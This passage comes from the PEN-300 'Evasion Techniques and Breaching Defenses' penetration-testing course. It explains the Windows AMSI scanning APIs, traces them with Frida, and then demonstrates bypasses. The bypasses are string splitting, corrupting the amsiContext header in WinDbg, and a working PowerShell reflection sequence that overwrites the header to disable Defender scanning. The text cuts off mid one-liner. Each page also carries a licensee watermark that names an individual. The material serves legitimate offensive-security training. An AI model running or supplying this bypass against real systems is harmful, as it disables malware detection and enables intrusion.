Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
223 
Relevant information captured by these APIs is forwarded to Windows Defender through an 
interprocess mechanism called Remote Procedure Call (RPC).353 After Windows Defender 
analyzes the data, the result is sent back to AMSI.DLL inside the PowerShell process. 
The 
AMSI 
exported 
APIs 
include 
AmsiInitialize, 
AmsiOpenSession, 
AmsiScanString, 
AmsiScanBuffer, and AmsiCloseSession.354 Since these functions have been officially 
documented by Microsoft, we’re able to understand the intricacies of the capture process. Let’s 
step through that capture process. 
When PowerShell is launched, it loads AMSI.DLL and calls AmsiInitialize,355 which takes two 
arguments as shown in the function prototype below: 
HRESULT AmsiInitialize( 
  LPCWSTR      appName, 
  HAMSICONTEXT *amsiContext 
); 
Listing 262 - Function prototype for AmsiInitialize 
The first parameter is the name of the application and the second is a pointer to a context 
structure that is populated by the function. This context structure, named amsiContext, is used in 
every subsequent AMSI-related function. 
Note that the call to AmsiInitialize takes place before we are able to invoke any PowerShell 
commands, which means we cannot influence it in any way. 
Once AmsiInitialize is complete and the context structure is created, AMSI can parse the issued 
commands. When we execute a PowerShell command, the AmsiOpenSession356 API is called: 
HRESULT AmsiOpenSession( 
  HAMSICONTEXT amsiContext, 
  HAMSISESSION *amsiSession 
); 
Listing 263 - Function prototype for AmsiOpenSession 
AmsiOpenSession accepts the amsiContext context structure and creates a session structure to 
be used in all calls within that session. This leads to the next two APIs that perform the actual 
captures. 
AmsiScanString357 and AmsiScanBuffer358 can both be used to capture the console input or script 
content either as a string or as a binary buffer respectively. 
 
353 (Microsoft, 2018), https://docs.microsoft.com/en-us/windows/win32/rpc/rpc-start-page 
354 (Microsoft, 2019), https://docs.microsoft.com/en-us/windows/win32/amsi/antimalware-scan-interface-functions 
355 (Microsoft, 2018), https://docs.microsoft.com/en-us/windows/win32/api/amsi/nf-amsi-amsiinitialize 
356 (Microsoft, 2018), https://docs.microsoft.com/en-us/windows/win32/api/amsi/nf-amsi-amsiopensession 
357 (Microsoft, 2018), https://docs.microsoft.com/en-us/windows/win32/api/amsi/nf-amsi-amsiscanstring 
358 (Microsoft, 2018), https://docs.microsoft.com/en-us/windows/win32/api/amsi/nf-amsi-amsiscanbuffer 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
224 
 
Note that AmsiScanBuffer supersedes AmsiScanString, which was vulnerable to 
a trivial bypass technique. 
AmsiScanBuffer accepts a few more arguments as shown in its function prototype in Listing 264. 
HRESULT AmsiScanBuffer( 
  HAMSICONTEXT amsiContext, 
  PVOID        buffer, 
  ULONG        length, 
  LPCWSTR      contentName, 
  HAMSISESSION amsiSession, 
  AMSI_RESULT  *result 
); 
Listing 264 - Function prototype for AmsiScanBuffer 
The first argument is the AMSI context buffer (amsiContext), followed by a pointer to the buffer 
containing the content to be scanned, and the length of the buffer. The following arguments are 
an input identifier (contentName), the session structure (amsiSession), and finally a pointer to a 
storage buffer for the result of the scan. 
Windows Defender scans the buffer passed to AmsiScanBuffer and returns the result value. This 
value is defined according to the AMSI_RESULT359 enum. A return value of “32768” indicates the 
presence of malware, and “1” indicates a clean scan. 
Once the scan is complete, calling AmsiCloseSession360 will close the current AMSI scanning 
session. This function is not that important to us since it takes place after the result of the scan 
and any AMSI bypasses must happen before it is called. 
Armed with this basic understanding of the AMSI mechanisms and APIs, let’s trace calls to these 
APIs to learn what, exactly, is passed in the buffer to AmsiScanBuffer. 
7.2.2 Hooking with Frida 
We could use WinDbg breakpoints to trace the calls to the exported AMSI calls, but the Frida361 
dynamic instrumentation framework offers a more flexible approach. 
Frida allows us to hook Win32 APIs through a Python backend while using JavaScript to display 
and interpret arguments and return values. 
Frida is pre-installed on the Windows 10 victim machine and to use it, we’ll first open a 64-bit 
PowerShell console and locate its process ID. This is the process we want to trace. 
Next, we’ll open a command prompt to trace from and invoke Frida with frida-trace. We’ll 
supply the process ID of the PowerShell process with -p, the DLL we want to trace with -x, and 
 
359 (Microsoft, 2018), https://docs.microsoft.com/en-gb/windows/win32/api/amsi/ne-amsi-amsi_result 
360 (Microsoft, 2018), https://docs.microsoft.com/en-us/windows/win32/api/amsi/nf-amsi-amsiclosesession 
361 (Frida.re), https://www.frida.re/ 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
225 
the names of the specific APIs we want to trace with -i. In this case, we will use a wildcard (*) to 
trace all functions beginning with “Amsi”: 
C:\Users\Offsec> frida-trace -p 1584 -x amsi.dll -i Amsi* 
Instrumenting functions... 
AmsiOpenSession: Auto-generated handler at 
"C:\\Users\\Offsec\\__handlers__\\amsi.dll\\AmsiOpenSession.js" 
AmsiUninitialize: Auto-generated handler at 
"C:\\Users\\Offsec\\__handlers__\\amsi.dll\\AmsiUninitialize.js" 
AmsiScanBuffer: Auto-generated handler at 
"C:\\Users\\Offsec\\__handlers__\\amsi.dll\\AmsiScanBuffer.js" 
AmsiUacInitialize: Auto-generated handler at 
"C:\\Users\\Offsec\\__handlers__\\amsi.dll\\AmsiUacInitialize.js" 
AmsiInitialize: Auto-generated handler at 
"C:\\Users\\Offsec\\__handlers__\\amsi.dll\\AmsiInitialize.js" 
AmsiCloseSession: Auto-generated handler at 
"C:\\Users\\Offsec\\__handlers__\\amsi.dll\\AmsiCloseSession.js" 
AmsiScanString: Auto-generated handler at 
"C:\\Users\\Offsec\\__handlers__\\amsi.dll\\AmsiScanString.js" 
AmsiUacUninitialize: Auto-generated handler at 
"C:\\Users\\Offsec\\__handlers__\\amsi.dll\\AmsiUacUninitialize.js" 
AmsiUacScan: Auto-generated handler at 
"C:\\Users\\Offsec\\__handlers__\\amsi.dll\\AmsiUacScan.js" 
Started tracing 9 functions. Press Ctrl+C to stop. 
Listing 265 - Start a tracing session with Frida 
At this point, Frida has hooked all the APIs shown in Listing 265 and we can trace the input and 
output. To test this, we’ll simply enter the letters “test” in the PowerShell prompt, which produces 
the following output from Frida: 
           /* TID 0x17f0 */ 
174222 ms  AmsiOpenSession() 
174223 ms  AmsiScanBuffer() 
174355 ms  AmsiScanBuffer() 
174366 ms  AmsiScanBuffer() 
174375 ms  AmsiScanBuffer() 
174382 ms  AmsiScanBuffer() 
174385 ms  AmsiScanBuffer() 
           /* TID 0x1934 */ 
174406 ms  AmsiCloseSession() 
           /* TID 0x17f0 */ 
174406 ms  AmsiOpenSession() 
174406 ms  AmsiScanBuffer() 
           /* TID 0x1934 */ 
174411 ms  AmsiCloseSession() 
Listing 266 - Tracing information from a “test” string in PowerShell 
Although we recognize calls to AmsiOpenSession, AmsiScanBuffer, and AmsiCloseSession, we 
have no way of knowing if our input is responsible for all those calls. 
When we start a Frida tracing session, handler files are created for each hooked API. For 
AmsiScanBuffer, the handler file is located at: 
C:\Users\Offsec\__handlers__\amsi.dll\AmsiScanBuffer.js 
Listing 267 - Location of the AmsiScanBuffer handler file 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
226 
If we open AmsiScanBuffer.js, we find the following auto-generated content that we can modify to 
investigate any call to AmsiScanBuffer: 
... 
  /** 
   * Called synchronously when about to call AmsiScanBuffer. 
   * 
   * @this {object} - Object allowing you to store state for use in onLeave. 
   * @param {function} log - Call this function with a string to be presented to the 
user. 
   * @param {array} args - Function arguments represented as an array of NativePointer 
objects. 
   * For example use args[0].readUtf8String() if the first argument is a pointer to a 
C string encoded as UTF-8. 
   * It is also possible to modify arguments by assigning a NativePointer object to an 
element of this array. 
   * @param {object} state - Object allowing you to keep state across function calls. 
   * Only one JavaScript function will execute at a time, so do not worry about race-
conditions. 
   * However, do not use this to store function arguments across onEnter/onLeave, but 
instead 
   * use "this" which is an object for keeping state local to an invocation. 
   */ 
  onEnter: function (log, args, state) { 
    log('AmsiScanBuffer()'); 
  }, 
 
  /** 
   * Called synchronously when about to return from AmsiScanBuffer. 
   * 
   * See onEnter for details. 
   * 
   * @this {object} - Object allowing you to access state stored in onEnter. 
   * @param {function} log - Call this function with a string to be presented to the 
user. 
   * @param {NativePointer} retval - Return value represented as a NativePointer 
object. 
   * @param {object} state - Object allowing you to keep state across function calls. 
   */ 
  onLeave: function (log, retval, state) { 
  } 
... 
Listing 268 - AmsiScanBuffer.js default content 
We can update the handler code to better understand Frida’s output and help analyze what is 
being detected. Since we have already inspected the signature of the API, we can update the 
JavaScript code in the onEnter function. 
Every hook in the handler file provides us with three arguments: the args array contains the 
arguments passed to the AMSI API, while the log method can be used to print the information we 
are trying to capture to the console. 
To provide visibility into the arguments provided to AmsiScanBuffer, we can add log statements 
for each entry in the args array: 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
227 
Our modified version of the onEnter hook for the AmsiScanBuffer function is shown in Listing 
269. 
onEnter: function (log, args, state) { 
  log('[*] AmsiScanBuffer()'); 
  log('|- amsiContext: ' + args[0]); 
  log('|- buffer: ' + Memory.readUtf16String(args[1])); 
  log('|- length: ' + args[2]); 
  log('|- contentName ' + args[3]); 
  log('|- amsiSession ' + args[4]); 
  log('|- result ' + args[5] + "\n"); 
  this.resultPointer = args[5]; 
}, 
Listing 269 - Function signature implemented in the JavaScript handler file 
The readUtf16String362 method is used with the second argument (the buffer to be scanned) to 
print out its content as a Unicode string. In addition, the last argument is the storage address of 
the antivirus scan result. This address is stored in the resultPointer JavaScript variable through 
the this363 keyword for later access. 
Our goal is to store the scan result pointer until the AMSI API exits at which point, we will read the 
result and print it to the console. To do this, we can hook the AmsiScanBuffer function exit 
through onLeave in the JavaScript handler code. 
onLeave: function (log, retval, state) { 
  log('[*] AmsiScanBuffer() Exit'); 
  resultPointer = this.resultPointer; 
  log('|- Result value is: ' + Memory.readUShort(resultPointer) + "\n"); 
} 
Listing 270 - Printing the return value when AmsiScanBuffer is done 
In this code, we’ve used the readUshort method to read the result value from the stored memory 
location and have printed it to the console. 
As soon as the JavaScript file is saved, Frida automatically refreshes the hooks from the handler 
files, so we can supply the same “test” string in the PowerShell prompt to obtain the following 
truncated output: 
... 
2730732 ms  AmsiOpenSession() 
2730732 ms  [*] AmsiScanBuffer() 
2730732 ms  |- amsiContext: 0x1f862fa6f40 
2730732 ms  |- buffer: test 
2730732 ms  |- length: 0x8 
2730732 ms  |- contentName 0x1f84ad8142c 
2730732 ms  |- amsiSession 0xd 
2730732 ms  |- result 0x599f9ce948 
 
2730744 ms  [*] AmsiScanBuffer() Exit 
 
362 (Frida.re), https://www.frida.re/docs/javascript-api/#memory 
363 (Mozilla, 2020), https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Operators/this 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
228 
2730744 ms  |- Result value is: 1 
... 
Listing 271 - Printing arguments and return value from AmsiScanBuffer 
If the Frida prompt ever stalls, we can press enter in our console to force printed 
output. 
Now that we can monitor input and output from the AmsiScanBuffer API, we notice our “test” 
input and a return of “1”, indicating that AMSI has flagged our code as non-malicious. 
Next, let’s enter a simple command in the PowerShell console that Windows Defender will detect 
as malicious: 
PS C:\Users\Offsec> 'AmsiUtils' 
At line:1 char:1 
+ 'AmsiUtils' 
+ ~~~~~~~~~~~ 
This script contains malicious content and has been blocked by your antivirus 
software. 
    + CategoryInfo          : ParserError: (:) [], ParentContainsErrorRecordException 
    + FullyQualifiedErrorId : ScriptContainedMaliciousContent 
Listing 272 - Malicious result from the entered command 
Although the command was benign, it was flagged as malicious nonetheless. The Frida output is 
shown in Listing 273: 
... 
4290781 ms  [*] AmsiScanBuffer() 
4290781 ms  |- amsiContext: 0x1f862fa6f40 
4290781 ms  |- buffer: 'AmsiUtils' 
4290781 ms  |- length: 0x16 
4290781 ms  |- contentName 0x1f84ad8142c 
4290781 ms  |- amsiSession 0x33 
4290781 ms  |- result 0x599f9ce948 
 
4290807 ms  [*] AmsiScanBuffer() Exit 
4290807 ms  |- Result value is: 32768 
... 
Listing 273 - AmsiScanBuffer reporting malicious content 
There is no doubt that the warning we received in the PowerShell prompt came from Windows 
Defender, but it is not clear why it was flagged. 
If we try to modify the command by splitting the string and concatenating them as shown in 
Listing 274, it is no longer flagged as malicious: 
PS C:\Users\Offsec> 'Am'+'siUtils' 
AmsiUtils 
Listing 274 - Splitting AmsiUtils in two strings 
The Frida trace provides more detail: 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
229 
4461772 ms  [*] AmsiScanBuffer() 
4461772 ms  |- amsiContext: 0x1f862fa6f40 
4461772 ms  |- buffer: 'Am'+'siUtils' 
4461772 ms  |- length: 0x1c 
4461772 ms  |- contentName 0x1f84ad8142c 
4461772 ms  |- amsiSession 0x36 
4461772 ms  |- result 0x599f9ce948 
 
4461781 ms  [*] AmsiScanBuffer() Exit 
4461781 ms  |- Result value is: 1 
Listing 275 - Frida trace for the concatenated AmsiUtils string 
From this input and output, we can deduce that, for reasons that will be revealed later, Windows 
Defender flagged the “AmsiUtils” string as malicious. However, we easily bypassed this simple 
protection by splitting and concatenating the string. 
7.2.2.1 Exercises 
1. 
Use Frida to trace innocent PowerShell commands and fill out the onEnter and onExit 
JavaScript functions of AmsiScanBuffer to observe how the content is being passed. 
2. 
Enter malicious commands and try to bypass AMSI detection by splitting strings into 
multiple parts. 
7.3 Bypassing AMSI With Reflection in PowerShell 
As demonstrated, AMSI passes every PowerShell command through Windows Defender’s 
signature detection before executing it. 
One way to evade AMSI is to obfuscate and encode our PowerShell commands and scripts, but 
this could eventually become an exhausting game of “cat and mouse”. 
In this section, we’ll take a much simpler approach and attempt to halt AMSI without crashing 
PowerShell. To do this, we’ll investigate two bypass techniques that rely on reflection and will 
allow us to interact with internal types and objects that are otherwise not accessible. 
7.3.1 What Context Mom? 
When we examined each of the AMSI Win32 APIs, we found that they all use the context structure 
that is created by calling AmsiInitialize. However, Microsoft has not documented this context 
structure. 
Undocumented functions, structures, and objects are often prone to error, and provide a golden 
opportunity for security researchers and exploit developers. In this particular case, if we can force 
some sort of error in this context structure, we may discover a way to crash or bypass AMSI 
without impacting PowerShell. 
Since this context structure is undocumented, we will use Frida to locate its address in memory 
and then use WinDbg to inspect its content. As before, we will open a PowerShell prompt and a 
trace it with Frida. Then, we’ll enter another “test” string to obtain the address of the context 
structure: 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
230 
27583730 ms  [*] AmsiScanBuffer() 
27583730 ms  |- amsiContext: 0x1f862fa6f40 
27583730 ms  |- buffer: test 
27583730 ms  |- length: 0x8 
27583730 ms  |- contentName 0x1f84ad8142c 
27583730 ms  |- amsiSession 0x38 
27583730 ms  |- result 0x599f9ce948 
 
27583742 ms  [*] AmsiScanBuffer() Exit 
27583742 ms  |- Result value is: 1 
Listing 276 - Locating memory address of amsiContext 
The highlighted section of Listing 276 reveals the memory address of amsiContext. Recall that 
amsiContext is created when AMSI is initialized so its memory address does not change between 
scans, allowing us to inspect it easily with WinDbg. 
As a next step, we’ll open WinDbg, attach to the PowerShell process, and dump the memory 
contents of the context structure as shown in Listing 277. 
0:014> dc 0x1f862fa6f40  
000001f8`62fa6f40  49534d41 00000000 48efe1f0 000001f8  AMSI.......H.... 
000001f8`62fa6f50  4905dd30 000001f8 00000039 00000000  0..I....9....... 
000001f8`62fa6f60  d722b5cb ad27f1b7 2a525af5 8c00025b  .."...'..ZR*[... 
000001f8`62fa6f70  0065004e 00730074 00610063 00650070  N.e.t.s.c.a.p.e. 
000001f8`62fa6f80  00420020 00730061 00200065 00520055   .B.a.s.e. .U.R. 
000001f8`62fa6f90  0000004c 00000000 2a555afa 92000312  L........ZU*.... 
000001f8`62fa6fa0  00740053 00650072 00740065 00410020  S.t.r.e.e.t. .A. 
000001f8`62fa6fb0  00640064 00650072 00730073 00000000  d.d.r.e.s.s..... 
Listing 277 - Content of the amsiContext buffer 
We don’t know the size of the context structure but we find that the first four bytes equate to the 
ASCII representation of “AMSI”. This seems rather interesting and might be usable since this 
string is likely static between processes. 
If we can observe the context structure in action in the AMSI APIs, we may be able to determine if 
the first four bytes are being referenced in any way. To do this, we’ll use the unassemble 
command in WinDbg along with the AmsiOpenSession function from the AMSI module: 
0:014> u amsi!AmsiOpenSession 
amsi!AmsiOpenSession: 
00007fff`c75c24c0 e943dcdb0b      jmp     00007fff`d3380108 
00007fff`c75c24c5 4885c9          test    rcx,rcx 
00007fff`c75c24c8 7441            je      amsi!AmsiOpenSession+0x4b 
(00007fff`c75c250b) 
00007fff`c75c24ca 8139414d5349    cmp     dword ptr [rcx],49534D41h 
00007fff`c75c24d0 7539            jne     amsi!AmsiOpenSession+0x4b 
(00007fff`c75c250b) 
00007fff`c75c24d2 4883790800      cmp     qword ptr [rcx+8],0 
00007fff`c75c24d7 7432            je      amsi!AmsiOpenSession+0x4b 
(00007fff`c75c250b) 
00007fff`c75c24d9 4883791000      cmp     qword ptr [rcx+10h],0 
Listing 278 - AmsiOpenSession comparing content of context structure 
The fourth line of assembly code is interesting as it compares the contents of a memory location 
to the four static bytes we just found inside the context structure. 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
231 
According to the 64-bit calling convention, we know that RCX will contain the function’s first 
argument. The first argument of AmsiOpenSession is exactly the context structure according to 
its function prototype, which means that a comparison is performed to check the header of the 
buffer. 
Although we don’t know much about this context structure, we observe that the first four bytes 
equate to the ASCII representation of “AMSI”. After the comparison instruction (shown in Listing 
278), we find a conditional jump instruction, JNE, which means “jump if not equal”. 
If the header bytes are not equal to this static DWORD, the conditional jump is triggered and 
execution goes to offset 0x4B inside the function. Let’s use WinDbg to display the instructions at 
that address: 
0:014> u amsi!AmsiOpenSession+0x4b L2 
amsi!AmsiOpenSession+0x4b: 
00007fff`c75c250b b857000780      mov     eax,80070057h 
00007fff`c75c2510 c3              ret 
Listing 279 - Code section after conditional jump in AmsiOpenSession 
The conditional jump leads directly to an exit of the function where the static value 0x80070057 is 
placed in the EAX register. On both the 32-bit and 64-bit architectures, the function return values 
are returned through the EAX/RAX register. 
If we revisit the function prototype of AmsiOpenSession as given in Listing 280, we notice that the 
return value type is HRESULT.364 
HRESULT AmsiOpenSession( 
  HAMSICONTEXT amsiContext, 
  HAMSISESSION *amsiSession 
); 
Listing 280 - Function prototype for AmsiOpenSession 
HRESULT values are documented and can be referenced on MSDN where we find that the 
numerical value 0x80070057 corresponds to the message text E_INVALIDARG.365 The message 
text, while not especially verbose, indicates that an argument, which we would assume to be 
amsiContext, is invalid. 
In short, this error occurs if the context structure has been corrupted. If the first four bytes of 
amsiContext do not match the header values, AmsiOpenSession will return an error. What we 
don’t know is what effect that error will cause. In a situation like this, there are typically two ways 
forward. 
The first is to trace the call to AmsiOpenSession that returns this error and try to figure out where 
that leads. This could become very time-consuming and complex. The second, and much simpler, 
approach is to force a failed AmsiOpenSession call, let the execution continue, and observe what 
happens in our Frida trace. Let’s try this approach first. 
 
364 (Microsoft, 2020), https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-erref/6b46e050-0761-44b1-858b-
9b37a74ca32e#gt_799103ab-b3cb-4eab-8c55-322821b2b235 
365 (Microsoft, 2020), https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-erref/705fb797-2175-4a90-b5a3-
3918024b10b8 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
232 
In order to force an error, we’ll place a breakpoint on AmsiOpenSession and trigger it by entering a 
PowerShell command. Once the breakpoint has been triggered, we’ll use ed to modify the first 
four bytes of the context structure, and let execution continue: 
0:014> bp amsi!AmsiOpenSession 
 
0:014> g 
Breakpoint 0 hit 
amsi!AmsiOpenSession: 
00007fff`c75c24c0 e943dcdb0b      jmp     00007fff`d3380108 
 
0:006> dc rcx L1 
000001f8`62fa6f40  49534d41                             AMSI 
 
0:006> ed rcx 0 
 
0:006> dc rcx L1 
000001f8`62fa6f40  00000000                             .... 
 
0:006> g 
Listing 281 - Modifying the context structure header 
After overwriting the AMSI header value, we’ll continue execution, which generates exceptions: 
30024801 ms  [*] AmsiOpenSession() 
30024801 ms  |- amsiContext: 0x1f862fa6f40 
30024801 ms  |- amsiSession: 0x7fff37328268 
 
30024803 ms  [*] AmsiOpenSession() Exit 
30024803 ms  |- HRESULT value is: 0x80070057 
Listing 282 - No additional AMSI APIs are called after corrupting the header 
According to this output, AmsiOpenSession() has exited. This could indicate that AMSI has been 
shut down. 
To test this, we’ll enter the ‘amsiutils’ string that was previously flagged as malicious: 
PS C:\Users\Offsec> 'amsiutils' 
amsiutils 
Listing 283 - No detection on amsiutils with corrupted context header 
This time, none of the hooked AMSI APIs are called and our command is not flagged. By 
corrupting the amsiContext header, we have effectively shut down AMSI without affecting 
PowerShell. We have effectively bypassed AMSI. Very nice. 
Although this method is effective, it relies on manual intervention with WinDbg. Let’s try to 
implement this bypass directly from PowerShell with reflection. 
PowerShell 
stores 
information 
about 
AMSI 
in 
managed 
code 
inside 
the 
System.Management.Automation.AmsiUtils class, which we can enumerate and interact with 
through reflection. 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
233 
As previously discussed, a key element of reflection is the GetType366 method, which we’ll invoke 
through System.Management.Automation.PSReference,367 also called [Ref]. 
GetType accepts the name of the assembly to resolve, which in this case is 
System.Management.Automation.AmsiUtils. Before we execute any code, we’ll close the current 
PowerShell session and open a new one to re-enable AMSI. 
Note that using a large number of AMSI trigger strings while testing may cause a 
“panic” in Windows Defender and it will suddenly consider everything malicious. 
At this point, the only remedy is to reboot the system. 
PS C:\Users\Offsec> [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils') 
At line:1 char:1 
+ [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils') 
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ 
This script contains malicious content and has been blocked by your antivirus 
software. 
    + CategoryInfo          : ParserError: (:) [], ParentContainsErrorRecordException 
    + FullyQualifiedErrorId : ScriptContainedMaliciousContent 
Listing 284 - Antivirus blocking our attempt to reference AmsiUtils class 
Sadly, Windows Defender and AMSI are blocking us from obtaining a reference to the class due to 
the malicious ‘AmsiUtils’ string. Instead, we can locate the class dynamically. 
We could again attempt to bypass Windows Defender with a split string like ‘ams’+‘iUtils’ (as 
some public bypasses do), but Microsoft regularly updates the signatures and this simple bypass 
may eventually fail. 
Instead, we’ll attempt another approach and loop the GetTypes368 method, searching for all types 
containing the string “iUtils” in its name: 
PS C:\Users\Offsec> $a=[Ref].Assembly.GetTypes() 
 
PS C:\Users\Offsec> Foreach($b in $a) {if ($b.Name -like "*iUtils") {$b}} 
 
IsPublic IsSerial Name                                     BaseType 
-------- -------- ----                                     -------- 
False    False    AmsiUtils                                System.Object 
Listing 285 - Getting all types and filtering them 
Armed with a handle to the AmsiUtils class, we can now invoke the GetFields369 method to 
enumerate all objects and variables contained in the class. Since GetFields accepts filtering 
modifiers, we’ll apply the NonPublic and Static filters to help narrow the results: 
 
366 (Microsoft, 2020), https://docs.microsoft.com/en-us/dotnet/api/system.reflection.assembly.gettype?view=netframework-4.8 
367 (Microsoft, 2018), https://docs.microsoft.com/en-
us/powershell/module/microsoft.powershell.core/about/about_ref?view=powershell-6 
368 (Microsoft, 2020), https://docs.microsoft.com/en-us/dotnet/api/system.reflection.assembly.gettypes?view=netframework-4.8 
369 (Microsoft, 2020), https://docs.microsoft.com/en-us/dotnet/api/system.type.getfields?view=netframework-4.8 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
234 
PS C:\Users\Offsec> Foreach($b in $a) {if ($b.Name -like "*iUtils") {$c=$b}} 
 
PS C:\Users\Offsec> $c.GetFields('NonPublic,Static') 
 
 
Name                   : amsiContext 
MetadataToken          : 67114374 
FieldHandle            : System.RuntimeFieldHandle 
Attributes             : Private, Static 
FieldType              : System.IntPtr 
MemberType             : Field 
ReflectedType          : System.Management.Automation.AmsiUtils 
DeclaringType          : System.Management.Automation.AmsiUtils 
Module                 : System.Management.Automation.dll 
IsPublic               : False 
IsPrivate              : True 
IsFamily               : False 
IsAssembly             : False 
IsFamilyAndAssembly    : False 
IsFamilyOrAssembly     : False 
IsStatic               : True 
IsInitOnly             : False 
IsLiteral              : False 
IsNotSerialized        : False 
IsSpecialName          : False 
IsPinvokeImpl          : False 
IsSecurityCritical     : True 
IsSecuritySafeCritical : False 
IsSecurityTransparent  : False 
CustomAttributes       : {} 
... 
Listing 286 - Enumerating stored objects in AmsiUtils class 
As we will soon realize, the amsiContext field contains the unmanaged amsiContext buffer. 
However, we can not reference the field directly since amsiContext also contains a malicious 
“amsi” string. We’ll again loop through all the fields, searching for a name containing “Context”: 
PS C:\Users\Offsec> $d=$c.GetFields('NonPublic,Static') 
 
PS C:\Users\Offsec> Foreach($e in $d) {if ($e.Name -like "*Context") {$f=$e}} 
 
PS C:\Users\Offsec> $f.GetValue($null) 
1514420113440 
Listing 287 - Finding the address of amsiContext through reflection 
Although we managed to obtain the amsiContext field without triggering AMSI, the output 
contains a very large integer. Converting this to hexadecimal produces 0x1609A791020, which 
looks like a valid memory address. 
To verify our theory that this is indeed the address of the amsiContext buffer, we’ll open and 
attach WinDbg and dump the memory at address 0x1609A791020: 
0:009> dc 0x1609A791020 
00000160`9a791020  49534d41 00000000 806db190 00000160  AMSI......m.`... 
00000160`9a791030  8086dd30 00000160 00000022 00000000  0...`..."....... 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
235 
00000160`9a791040  6372756f 00007365 cf43afd2 91000300  ources....C..... 
00000160`9a791050  554c4c41 53524553 464f5250 3d454c49  ALLUSERSPROFILE= 
00000160`9a791060  505c3a43 72676f72 61446d61 00006174  C:\ProgramData.. 
00000160`9a791070  00000000 00000000 cf5eafd1 80000400  ..........^..... 
00000160`9a791080  00000000 00000000 9a791080 00000160  ..........y.`... 
00000160`9a791090  00000000 00000000 80000000 00000000  ................ 
Listing 288 - Verifying the address of amsiContext in WinDbg 
The first four bytes at the dumped address contain the AMSI header values, indicating that this is 
very likely the amsiContext buffer. 
Now, let’s put this all together. We’ll recreate each of the steps and use Copy370 to overwrite the 
amsiContext header by copying data (four zeros) from managed to unmanaged memory: 
PS C:\Users\Offsec> $a=[Ref].Assembly.GetTypes() 
 
PS C:\Users\Offsec> Foreach($b in $a) {if ($b.Name -like "*iUtils") {$c=$b}} 
 
PS C:\Users\Offsec> $d=$c.GetFields('NonPublic,Static') 
 
PS C:\Users\Offsec> Foreach($e in $d) {if ($e.Name -like "*Context") {$f=$e}} 
 
PS C:\Users\Offsec> $g=$f.GetValue($null) 
 
PS C:\Users\Offsec> [IntPtr]$ptr=$g 
 
PS C:\Users\Offsec> [Int32[]]$buf=@(0) 
 
PS C:\Users\Offsec> [System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $ptr, 1) 
Listing 289 - Overwriting the amsiContext header bytes 
We do not get any output from the executed commands, but we can inspect our work by 
switching to WinDbg, forcing a break through Debug > Break and dumping the content of the 
amsiContext buffer: 
(1284.1ff8): Break instruction exception - code 80000003 (first chance) 
ntdll!DbgBreakPoint: 
00007fff`d3521f80 cc              int     3 
0:010> dc 0x1609A791020 
00000160`9a791020  00000000 00000000 806db190 00000160  ..........m.`... 
00000160`9a791030  8086dd30 00000160 00000037 00000000  0...`...7....... 
00000160`9a791040  6372756f 00007365 cf43afd2 91000300  ources....C..... 
00000160`9a791050  554c4c41 53524553 464f5250 3d454c49  ALLUSERSPROFILE= 
00000160`9a791060  505c3a43 72676f72 61446d61 00006174  C:\ProgramData.. 
00000160`9a791070  00000000 00000000 cf5eafd1 80000400  ..........^..... 
00000160`9a791080  00000000 00000000 9a791080 00000160  ..........y.`... 
00000160`9a791090  00000000 00000000 80000000 00000000  ................ 
Listing 290 - Verifying the overwritten AMSI header 
This output indicates that the context structure header was indeed overwritten, which should 
force AmsiOpenSession to error out. 
 
370 (Microsoft, 2020), https://docs.microsoft.com/en-
us/dotnet/api/system.runtime.interopservices.marshal.copy?view=netframework-4.8 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
236 
Next, let’s continue execution in the debugger, switch back to PowerShell, and enter the malicious 
‘amsiutils’ string: 
PS C:\Users\Offsec> 'amsiutils' 
amsiutils 
Listing 291 - No detection on amsiutils with corrupted context header 
The string was not flagged. Excellent. 
We can combine this bypass into a PowerShell one-liner: 
PS C:\Users\Offsec> $a=[Ref].Assembly.GetTypes();Foreach($b in $a) {if ($b.Name -like 
